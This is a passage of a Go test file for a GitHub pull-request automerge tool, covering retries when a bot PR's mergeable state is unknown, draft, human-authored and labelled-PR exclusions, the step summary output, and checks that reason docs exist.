		MergeMethod: "squash",
	}

	meta := workflowmeta.Metadata{
		ServerURL:  "https://github.com",
		Repository: "kachick/workflows",
	}

	err := execute(context.Background(), cfg, runner, nil, nil, meta)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	content, err := os.ReadFile(summaryFile)
	if err != nil {
		t.Fatalf("failed to read step summary file: %v", err)
	}

	if !strings.Contains(string(content), "### 🤖 Automerge Summary") {
		t.Errorf("expected summary header, got: %s", string(content))
	}
	if !strings.Contains(string(content), "✅ Merged") {
		t.Errorf("expected merged icon in summary, got: %s", string(content))
	}
}

func TestShouldRetryMergeable(t *testing.T) {
	basePR := PullRequest{
		Number:      100,
		Title:       "Bump test package",
		Author:      Author{Login: "renovate[bot]"},
		IsDraft:     false,
		Mergeable:   "UNKNOWN",
		Labels:      []Label{},
		BaseRefName: "main",
	}

	if !shouldRetryMergeable(basePR, defaultAllowedBots) {
		t.Errorf("expected shouldRetryMergeable to return true for valid bot PR")
	}

	draftPR := basePR
	draftPR.IsDraft = true
	if shouldRetryMergeable(draftPR, defaultAllowedBots) {
		t.Errorf("expected shouldRetryMergeable to return false for draft PR")
	}

	humanPR := basePR
	humanPR.Author.Login = "kachick"
	if shouldRetryMergeable(humanPR, defaultAllowedBots) {
		t.Errorf("expected shouldRetryMergeable to return false for human PR")
	}

	blockedPR := basePR
	blockedPR.Labels = []Label{{Name: blockedLabelName}}
	if shouldRetryMergeable(blockedPR, defaultAllowedBots) {
		t.Errorf("expected shouldRetryMergeable to return false for blocked PR")
	}

	vetoedPR := basePR
	vetoedPR.Labels = []Label{{Name: vetoLabelName}}
	if shouldRetryMergeable(vetoedPR, defaultAllowedBots) {
		t.Errorf("expected shouldRetryMergeable to return false for vetoed PR")
	}
}

func TestExecuteRetriesUnknownMergeable(t *testing.T) {
	origInterval := mergeableRetryInterval
	mergeableRetryInterval = time.Millisecond
	defer func() {
		mergeableRetryInterval = origInterval
	}()

	validChecks := []StatusCheckItem{
		{Status: "COMPLETED", Conclusion: "SUCCESS"},
	}

	t.Run("succeeds when mergeable becomes MERGEABLE on retry", func(t *testing.T) {
		initialPR := PullRequest{
			Number:            801,
			Title:             "Bump foo from 1.0.0 to 1.1.0",
			Author:            Author{Login: "dependabot[bot]"},
			IsDraft:           false,
			Mergeable:         "UNKNOWN",
			StatusCheckRollup: validChecks,
		}

		resolvedPR := initialPR
		resolvedPR.Mergeable = "MERGEABLE"

		runner := &mockRunner{
			prs: []PullRequest{initialPR},
			fetchPRResponses: map[int][]*PullRequest{
				801: {&resolvedPR},
			},
		}

		cfg := &Config{
			AllowedBots: defaultAllowedBots,
			MergeMethod: "squash",
		}
		meta := workflowmeta.Metadata{ServerURL: "https://github.com", Repository: "kachick/workflows"}

		if err := execute(context.Background(), cfg, runner, nil, nil, meta); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}

		if len(runner.mergedPRs) != 1 || runner.mergedPRs[0] != 801 {
			t.Errorf("expected PR 801 to be merged after retry, got %v", runner.mergedPRs)
		}
		if runner.fetchPRCalls[801] != 1 {
			t.Errorf("expected 1 fetchPR call, got %d", runner.fetchPRCalls[801])
		}
	})

	t.Run("skips when mergeable remains UNKNOWN after max retries", func(t *testing.T) {
		initialPR := PullRequest{
			Number:            802,
			Title:             "Bump foo from 1.0.0 to 1.1.0",
			Author:            Author{Login: "dependabot[bot]"},
			IsDraft:           false,
			Mergeable:         "UNKNOWN",
			StatusCheckRollup: validChecks,
		}

		runner := &mockRunner{
			prs: []PullRequest{initialPR},
			fetchPRResponses: map[int][]*PullRequest{
				802: {&initialPR, &initialPR, &initialPR},
			},
		}

		cfg := &Config{
			AllowedBots: defaultAllowedBots,
			MergeMethod: "squash",
		}
		meta := workflowmeta.Metadata{ServerURL: "https://github.com", Repository: "kachick/workflows"}

		if err := execute(context.Background(), cfg, runner, nil, nil, meta); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}

		if len(runner.mergedPRs) != 0 {
			t.Errorf("expected no PR to be merged, got %v", runner.mergedPRs)
		}
		if runner.fetchPRCalls[802] != mergeableRetryMaxAttempts {
			t.Errorf("expected %d fetchPR calls, got %d", mergeableRetryMaxAttempts, runner.fetchPRCalls[802])
		}
	})
}

func TestReasonDocsExist(t *testing.T) {
	if os.Getenv("MINIMIZED_ASSETS") != "" {
		t.Skip("skipping doc existence test because non-Go assets are excluded from fileset")
	}

	docs := []string{
		docReasonUnknownMergeable,
		docReasonConflicting,
	}

	repoRoot := filepath.Join("..", "..")

	for _, doc := range docs {
		fullPath := filepath.Join(repoRoot, filepath.FromSlash(doc))
		info, err := os.Stat(fullPath)
		if err != nil {
			t.Errorf("reason doc %q does not exist: %v", doc, err)
			continue
		}
		if info.Size() == 0 {
			t.Errorf("reason doc %q is empty", doc)
		}
	}
}
